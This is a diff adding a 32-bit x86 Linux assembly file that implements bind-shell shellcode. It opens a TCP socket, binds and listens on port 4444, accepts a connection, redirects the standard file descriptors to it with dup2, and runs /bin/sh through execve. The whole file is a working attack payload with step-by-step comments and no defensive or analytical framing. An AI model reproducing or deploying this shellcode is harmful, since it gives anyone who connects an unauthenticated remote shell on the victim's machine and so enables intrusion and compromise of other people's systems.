@@ -1,0 +1,85 @@
+bits 32
+
+;socketcall(SYS_SOCKET,socket[AF_INET,SOCK_STREAM,protocol])
+;socketcall(1,[2,1,0]) 
+
+xor eax,eax
+push eax
+inc eax
+mov ebx,eax
+push eax
+inc eax
+push eax
+mov ecx,esp
+mov al,0x66
+int 0x80
+
+
+;socketcall(SYS_BIND, bind[Return_Sys_Socket,[AF_INET,socket.htons(port),default_port],length])
+;socketcall(2,bind[eax,[2,socket.htons(port),0],16])
+
+mov edx,eax 
+xor eax,eax
+pop ebx; pop 2
+pop ecx; pop useless 1
+;top = 0
+push word 0x5c11
+push word bx ; ebx=2
+mov ecx,esp
+push dword 16
+push ecx; tab 2[] 
+push edx 
+mov ecx,esp;tab 1[]
+mov al,0x66
+int 0x80
+
+;socketcall(SYS_LISTEN,listen[Return_Sys_Socket,Length_max_recv?])
+;socketcall(4,[edx,0])
+;success == eax=0
+
+mov bl,4
+push eax
+push edx
+mov ecx,esp
+mov al,0x66
+int 0x80
+
+
+;socketcall(SYS_ACCEPT,accept[Return_Sys_Socket,[],length])
+;socketcall(5,[edx,0,0]]
+
+mov bl,5
+
+push eax
+push eax
+push edx
+
+mov ecx,esp
+
+mov al,0x66
+int 0x80
+
+;dup2(oldfd,newfd)
+
+mov ebx,eax;get previous fd
+xor ecx,ecx
+mov cl, 2 ; STDERR
+
+loop:
+	mov al,0x3f
+	int 0x80
+	dec ecx
+	jns loop
+
+;execve(/bin//sh,&/bin//sh,*null)
+xor eax,eax
+push eax
+push 0x68732f2f
+push 0x6e69622f
+mov ebx,esp
+push eax
+mov edx,esp
+push ebx
+mov ecx,esp
+mov al,0xb
+int 0x80
